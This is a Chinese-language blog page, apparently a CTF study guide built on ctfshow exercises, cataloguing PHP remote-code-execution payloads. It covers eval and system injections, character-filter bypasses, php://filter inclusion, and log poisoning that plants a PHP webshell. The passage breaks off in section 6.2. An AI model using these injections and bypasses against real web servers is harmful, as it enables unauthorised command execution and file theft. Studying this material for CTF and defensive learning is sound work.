@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="RCE（远程代码执行漏洞）前言RCE（Remote Code  Execution，远程代码执行）漏洞是指攻击者通过漏洞，能够在目标系统上远程执行任意代码的安全漏洞。这种漏洞通常允许攻击者在受害主机上执行恶意命令，可能导致系统被完全控制，甚至可能被用来执行系统级操作，如删除文件、窃取敏感数据、安装恶意软件等。本文基于ctfshow命令执行部分，整理了RCE常见函数与命令。文章很长，建议配合右下角目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="RCE（远程代码执行漏洞）前言RCE（Remote Code  Execution，远程代码执行）漏洞是指攻击者通过漏洞，能够在目标系统上远程执行任意代码的安全漏洞。这种漏洞通常允许攻击者在受害主机上执行恶意命令，可能导致系统被完全控制，甚至可能被用来执行系统级操作，如删除文件、窃取敏感数据、安装恶意软件等。本文基于ctfshow命令执行部分，整理了RCE常见函数与命令。文章很长，建议配合右下角目">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-05-20T00:55:54.000Z">
+<meta property="article:modified_time" content="2025-05-20T00:55:54.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Web/RCE（远程代码执行漏洞）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="RCE（远程代码执行漏洞）"><a href="#RCE（远程代码执行漏洞）" class="headerlink" title="RCE（远程代码执行漏洞）"></a>RCE（远程代码执行漏洞）</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>RCE（Remote Code  Execution，远程代码执行）漏洞是指攻击者通过漏洞，能够在目标系统上远程执行任意代码的安全漏洞。这种漏洞通常允许攻击者在受害主机上执行恶意命令，可能导致系统被完全控制，甚至可能被用来执行系统级操作，如删除文件、窃取敏感数据、安装恶意软件等。<br>本文基于ctfshow命令执行部分，整理了RCE常见函数与命令。文章很长，建议配合右下角目录食用。</p>
+<hr>
+<h1 id="一-命令执行函数"><a href="#一-命令执行函数" class="headerlink" title="一. 命令执行函数"></a>一. 命令执行函数</h1><p>以下函数都应当在<code>eval</code>​中执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    </span><br><span class="line">	<span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];                </span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable">$c</span>);       </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="1-1-system函数命令执行"><a href="#1-1-system函数命令执行" class="headerlink" title="1.1 system函数命令执行"></a>1.1 system函数命令执行</h2><p>通过system函数执行操作系统的shell命令并输出结果</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">?c=system(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-passthru函数命令执行"><a href="#1-2-passthru函数命令执行" class="headerlink" title="1.2 passthru函数命令执行"></a>1.2 passthru函数命令执行</h2><p>​<code>passthru</code>​和<code>system</code>​函数差不多</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-3-echo-反引号命令执行"><a href="#1-3-echo-反引号命令执行" class="headerlink" title="1.3 echo+反引号命令执行"></a>1.3 echo+反引号命令执行</h2><p>用反引号执行shell命令，但是反引号执行完命令不会被输出，所以需要配合echo函数输出结果</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `ls`;</span><br><span class="line">?c=echo `tac flag.php`;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-4-shell-exec函数命令执行"><a href="#1-4-shell-exec函数命令执行" class="headerlink" title="1.4 shell_exec函数命令执行"></a>1.4 shell_exec函数命令执行</h2><p>​<code>shell_exec</code>​函数和反引号类似，只执行但不返回，需要配合<code>echo</code>​命令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo shell_exec(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="二-常用命令"><a href="#二-常用命令" class="headerlink" title="二. 常用命令"></a>二. 常用命令</h1><p>以下命令应当在命令执行函数中执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    </span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    </span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-0-phpinfo-测试命令执行"><a href="#1-0-phpinfo-测试命令执行" class="headerlink" title="1.0 phpinfo()测试命令执行"></a>1.0 phpinfo()测试命令执行</h2><p>​<code>phpinfo()</code>​命令被广泛应用于是否存在RCE命令执行漏洞的测试，例如检验是否成功写入了一句话木马。更加重要的是，phpinfo中<code>disable_functions</code>​项会提供被禁用的命令，对进一步的漏洞利用具有重大帮助</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-1-ls命令目录读取"><a href="#1-1-ls命令目录读取" class="headerlink" title="1.1 ls命令目录读取"></a>1.1 ls命令目录读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-cat命令文件读取"><a href="#1-2-cat命令文件读取" class="headerlink" title="1.2 cat命令文件读取"></a>1.2 cat命令文件读取</h2><p>​<code>cat</code>​不会将结果数据到页面上，要看源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=cat flag.php</span><br><span class="line">?c=/bin/cat flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-3-tac命令文件读取"><a href="#1-3-tac命令文件读取" class="headerlink" title="1.3 tac命令文件读取"></a>1.3 tac命令文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-4-vi命令文件读取"><a href="#1-4-vi命令文件读取" class="headerlink" title="1.4 vi命令文件读取"></a>1.4 vi命令文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=vi flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-5-uniq命令文件读取"><a href="#1-5-uniq命令文件读取" class="headerlink" title="1.5 uniq命令文件读取"></a>1.5 uniq命令文件读取</h2><p>uniq函数的作用是删除文件重复行并输出剩余内容，可以用于文件读取。与cat一样，结果在源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=uniq flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-6-base64命令读取文件"><a href="#1-6-base64命令读取文件" class="headerlink" title="1.6 base64命令读取文件"></a>1.6 base64命令读取文件</h2><p>base64命令可以读取flag.php并编码后输出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=base64 flag.php</span><br><span class="line">?c=/bin/base64 flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-7-grep命令文件读取"><a href="#1-7-grep命令文件读取" class="headerlink" title="1.7 grep命令文件读取"></a>1.7 grep命令文件读取</h2><p>grep用于查询文件中包含某个特定字符串的行并输出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=grep <span class="string">&#x27;fla&#x27;</span> flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-8-sort命令排序输出"><a href="#1-8-sort命令排序输出" class="headerlink" title="1.8 sort命令排序输出"></a>1.8 sort命令排序输出</h2><p>sort是一个排序命令，<code>sort filename</code>​会将文件内容进行<strong>行间</strong>的排序并输出文本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=sort flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-9-mv命令文件重命名"><a href="#1-9-mv命令文件重命名" class="headerlink" title="1.9 mv命令文件重命名"></a>1.9 mv命令文件重命名</h2><p>mv函数的作用是对文件进行重命名，通过修改后缀名为txt，可以直接在网页中访问txt文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=mv f?lg.php a.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-10-cp命令文件内容复制"><a href="#1-10-cp命令文件内容复制" class="headerlink" title="1.10 cp命令文件内容复制"></a>1.10 cp命令文件内容复制</h2><p>用cp命令将flag的内容复制到<code>1.txt</code>​上，然后访问<code>/1.txt</code>​文件读取，注意使用反引号进行命令执行时，还是需要使用<code>echo</code>​</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=cp flag.php <span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line">?c=echo `cp flag.php <span class="number">1.</span>txt`;</span><br></pre></td></tr></table></figure>
+
+<h1 id="三-文件名过滤"><a href="#三-文件名过滤" class="headerlink" title="三. 文件名过滤"></a>三. 文件名过滤</h1><h2 id="3-1-​通配符绕过"><a href="#3-1-​通配符绕过" class="headerlink" title="3.1 *​通配符绕过"></a>3.1 <code>*</code>​通配符绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac fl*g.php&quot;</span>);</span><br><span class="line">?c=system(<span class="string">&quot;tac fl*&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-2-​空字符匹配绕过"><a href="#3-2-​空字符匹配绕过" class="headerlink" title="3.2 &#39;&#39;​空字符匹配绕过"></a>3.2 <code>&#39;&#39;</code>​空字符匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac fla&#x27;&#x27;g.php&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>空字符串</strong>的可以用于绕过某些字符过滤，<code>fla&#39;&#39;g.php</code>​ 等价于 <code>flag.php</code>​</p>
+<h2 id="3-3-​匹配绕过"><a href="#3-3-​匹配绕过" class="headerlink" title="3.3 \​匹配绕过"></a>3.3 <code>\</code>​匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac fl\ag.php&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>​<code>\</code>​ 是 **转义字符**，通常用于转义后面的字符，在某些情况下，<code>fl\ag.php</code>​ 可能会被解释为 <code>flag.php</code>​，即通过插入转义字符来避免直接匹配敏感词或绕过过滤</p>
+<h2 id="3-4-​占位绕过"><a href="#3-4-​占位绕过" class="headerlink" title="3.4 ?​占位绕过"></a>3.4 <code>?</code>​占位绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac f???????&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在很多操作系统的文件系统中，<code>?</code>​ 被用作通配符，代表 <strong>任何单个字符</strong>。在 Linux 中，<code>f???????</code>​ 可以匹配任何以 <code>f</code>​ 开头并包含 7 个任意字符的文件名</p>
+<h2 id="3-5-传参执行绕过"><a href="#3-5-传参执行绕过" class="headerlink" title="3.5 传参执行绕过"></a>3.5 传参执行绕过</h2><h3 id="3-5-1-eval函数"><a href="#3-5-1-eval函数" class="headerlink" title="3.5.1 eval函数"></a>3.5.1 eval函数</h3><p>eval函数执行任意php命令，这里利用get方式接受x参数，在传参中执行命令，而在这个get方式接受的参数并没有被过滤</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[x]);&amp;x=system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">?c=eval($_GET[x]);&amp;x=system(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-5-2-include函数"><a href="#3-5-2-include函数" class="headerlink" title="3.5.2 include函数"></a>3.5.2 include函数</h3><p>这个方法实际上是结合了文件包含漏洞，利用文件包含读取flag</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include($_GET[x]);&amp;x=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>如果<code>(</code>​和<code>;</code>​被过滤：<br>​<code>%0a</code>​ 是 URL 编码中表示换行符（<code>\n</code>​）的字符。从而使得 <code>include</code>​ 语句和 <code>$_GET[1]</code>​ 的处理被分开，从而绕过过滤机制，不过include函数这里不加<code>(</code>​也是可以的<br>php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?&gt;前可以不写分号。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include%<span class="number">0</span>a$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br><span class="line">?c=include$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-5-3-日志包含"><a href="#3-5-3-日志包含" class="headerlink" title="3.5.3 日志包含"></a>3.5.3 日志包含</h3><p>既然能够执行文件包含，那么也可以包含日志文件，日志文件中会记录你的UA头，假设我们在UA头中写入后门代码，然后我们包含日志文件，那么就能通过后门代码读取文件，日志包含可以参考我过去的文章。这里的日志目录需要多次尝试。用蚁剑连接<code>http://576f2421-5308-45ef-9c2e-17454de9e09a.challenge.ctf.show/?c=include$_GET[1]?%3E&amp;1=../../../../var/log/nginx/access.log</code>​即可，注意要用<code>http</code>​，浏览器上直接粘下来会由于SSL证书连不上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=../../../../var/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>  </span><br><span class="line"></span><br><span class="line">User-Agent:&lt;?php eval($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-6-变量作用域劫持攻击"><a href="#3-6-变量作用域劫持攻击" class="headerlink" title="3.6 变量作用域劫持攻击"></a>3.6 变量作用域劫持攻击</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">post:</span><br><span class="line">	<span class="number">1</span>=system(<span class="string">&#x27;tac fl*&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-6-1-函数解释"><a href="#3-6-1-函数解释" class="headerlink" title="3.6.1 函数解释"></a>3.6.1 函数解释</h3><ul>
+<li>​<strong>​<code>get_defined_vars()</code>​</strong> ​<br>获取当前作用域中所有定义的变量，返回一个数组，键是变量名，值是对应的变量值。</li>
+<li>​<strong>​<code>next(get_defined_vars())</code>​</strong> ​<br>将指针移动到数组中的下一个元素，并返回该元素的值。在这里，指针操作的对象是由 <code>get_defined_vars()</code>​ 返回的数组。</li>
+<li>​<strong>​<code>array_pop(...)</code>​</strong> ​<br>弹出数组的最后一个元素。这里作用在 <code>next(get_defined_vars())</code>​ 的结果上，获取这个数组的最后一个变量值。</li>
+</ul>
+<h3 id="3-6-2-攻击流程"><a href="#3-6-2-攻击流程" class="headerlink" title="3.6.2 攻击流程"></a>3.6.2 攻击流程</h3><ul>
+<li>攻击者通过 <code>POST</code>​ 请求传入 <code>1=system(&#39;tac fl*&#39;);</code>​，在服务器端该数据被<strong>存储为变量</strong>。</li>
+<li>​<code>array_pop(next(get_defined_vars()))</code>​ 获取该变量值，即 <code>system(&#39;tac fl*&#39;)</code>​。</li>
+<li>​<code>eval()</code>​ 动态执行，触发 <code>system(&#39;tac fl*&#39;)</code>​，攻击者能够获取敏感文件内容。</li>
+</ul>
+<h2 id="3-7-函数嵌套文件枚举"><a href="#3-7-函数嵌套文件枚举" class="headerlink" title="3.7 函数嵌套文件枚举"></a>3.7 函数嵌套文件枚举</h2><p>​<code>getcwd()</code>​ 函数返回当前工作目录的路径。<br>​<code>scandir()</code>​ 函数列出指定目录中的所有文件和目录，并返回一个包含文件和目录名称的数组。<br>​<code>show_source()</code>​ 函数用于显示一个 PHP 文件的源代码<br>通过这三个函数，拼接出了flag.php文件，并使用<code>show_source</code>​输出。这里的<code>[2]</code>​要多尝试，flag文件的位置不一定会在第2位</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(scandir(getcwd())[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-8-函数嵌套文件读取"><a href="#3-8-函数嵌套文件读取" class="headerlink" title="3.8 函数嵌套文件读取"></a>3.8 函数嵌套文件读取</h2><p>这个函数拼接实际上是上面的复杂版，适用于<code>[]</code>​被过滤的情况，不能直接遍历<code>scandir</code>​数组，只能使用指针操作来获取特定文件，由于前两个文件是<code>.</code>​和<code>..</code>​，因此用<code>array_reverse</code>​函数从最后一个文件开始。由于指针操作函数的作用是返回值而非地址，因此不能嵌套使用，利用这种方式只能读取很有限的几个文件。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读取最后一个文件</span><br><span class="line">?c=show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line">读取倒数第二个元素</span><br><span class="line">?c=show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
+
+<p>还可以用另一个函数得到目录</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<h1 id="四-空格过滤"><a href="#四-空格过滤" class="headerlink" title="四. 空格过滤"></a>四. 空格过滤</h1><h2 id="4-1-20​空格绕过"><a href="#4-1-20​空格绕过" class="headerlink" title="4.1 %20​空格绕过"></a>4.1 <code>%20</code>​空格绕过</h2><p>是 URL 编码的空格</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac%20flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-2-09​空格绕过"><a href="#4-2-09​空格绕过" class="headerlink" title="4.2 %09​空格绕过"></a>4.2 <code>%09</code>​空格绕过</h2><p>​<code>%09</code>​ 是 URL 编码中的水平制表符（Tab，ASCII 码为 9），它的作用是将 <code>tac</code>​ 后面的 <code>fla*</code>​ 和前面的部分隔开，通常它不会影响命令的执行，只是空格的替代。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac%09flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-3-IFS-9​空格绕过"><a href="#4-3-IFS-9​空格绕过" class="headerlink" title="4.3 $IFS$9​空格绕过"></a>4.3 <code>$IFS$9</code>​空格绕过</h2><p>​<code>$IFS</code>​ 是一个特殊的环境变量，表示 <strong>Internal Field Separator（内部字段分隔符）</strong> ，默认情况下，<code>$IFS</code>​ 的值包含空格、制表符和换行符。<code>$9</code>​是命令行参数的占位符之一，会被解析为空字符串。两者结合可以起到空格的作用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac$IFS$9flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-4-IFS-​绕过"><a href="#4-4-IFS-​绕过" class="headerlink" title="4.4 ${IFS}​绕过"></a>4.4 <code>$&#123;IFS&#125;</code>​绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac$&#123;IFS&#125;flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-5"><a href="#4-5" class="headerlink" title="4.5 &lt;​空格绕过"></a>4.5 <code>&lt;</code>​空格绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac&lt;fla*&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​<code>&lt;</code>​ 是 <strong>输入重定向符号</strong>，用于将文件内容作为命令的输入，可以用于空格绕过。</p>
+<h1 id="五-命令过滤"><a href="#五-命令过滤" class="headerlink" title="五. 命令过滤"></a>五. 命令过滤</h1><h2 id="5-1-​空字符匹配绕过"><a href="#5-1-​空字符匹配绕过" class="headerlink" title="5.1 &#39;&#39;​空字符匹配绕过"></a>5.1 <code>&#39;&#39;</code>​空字符匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;ta&#x27;&#x27;c flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>和文件名绕过一样，<strong>空字符串</strong>的可以用于绕过某些函数的过滤，<code>ta&#39;&#39;c</code>​ 等价于 <code>tac</code>​</p>
+<h2 id="5-2-​匹配绕过"><a href="#5-2-​匹配绕过" class="headerlink" title="5.2 \​匹配绕过"></a>5.2 <code>\</code>​匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;ta\c flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>​<code>\</code>​ 是 **转义字符**，通常用于转义后面的字符，在某些情况下，<code>ta\c</code>​ 可能会被解释为 <code>tac</code>​，即通过插入转义字符来避免直接匹配敏感词或绕过过滤</p>
+<h2 id="5-3-命令文件-​绕过"><a href="#5-3-命令文件-​绕过" class="headerlink" title="5.3 命令文件+?​绕过"></a>5.3 命令文件+<code>?</code>​绕过</h2><p>cat命令所在的路径是在&#x2F;bin&#x2F;目录下，所以这里相当于直接调用了cat文件执行命令，这里的cat可以看作命令，也是一个文件，所以通配符可以用在这上面，如果bin被过滤了也可以用通配符<br>记得cat要看源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/c?t flag.php</span><br><span class="line">?c=/?in/c?t flag.php</span><br></pre></td></tr></table></figure>
+
+<p>同理，base64命令也可以这样操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/ba?e64 flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-4-换用其他命令"><a href="#5-4-换用其他命令" class="headerlink" title="5.4 换用其他命令"></a>5.4 换用其他命令</h2><p>在第一部分有这么多函数，说不定有些没被过滤呢</p>
+<h1 id="六-字母过滤"><a href="#六-字母过滤" class="headerlink" title="六. 字母过滤"></a>六. 字母过滤</h1><h2 id="6-1-base64命令文件执行"><a href="#6-1-base64命令文件执行" class="headerlink" title="6.1 base64命令文件执行"></a>6.1 base64命令文件执行</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/base64 flag.php</span><br><span class="line">?c=/???/????<span class="number">64</span> ????.???</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-2-数字ASCII码代替字母"><a href="#6-2-数字ASCII码代替字母" class="headerlink" title="6.2 数字ASCII码代替字母"></a>6.2 数字ASCII码代替字母</h2><p>​<code>$&#39;</code>​ 是 Bash 中的字符转义机制，用于解析以反斜杠 <code>\</code>​ 开头的转义字符或八进制&#x2F;十六进制字符表示。其中，以<code>\143</code>​为例，<code>\143</code>​ 是 ASCII 八进制表示，转换为字符 <strong>​<code>c</code>​</strong>​。</p>
